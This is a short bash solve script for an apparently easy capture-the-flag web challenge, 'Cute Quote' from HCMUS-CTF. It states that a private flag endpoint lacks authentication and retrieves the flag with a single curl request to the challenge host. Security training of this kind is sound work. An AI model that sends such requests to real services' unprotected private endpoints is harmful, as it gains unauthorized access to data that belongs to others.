#!/bin/bash
# Solve: Cute Quote (Web - Easy)
# The /api/private/flag endpoint returns the flag with NO authentication.
# Just curl it.

curl http://challenge-host:3000/api/private/flag

# Expected output: HCMUS-CTF{...}
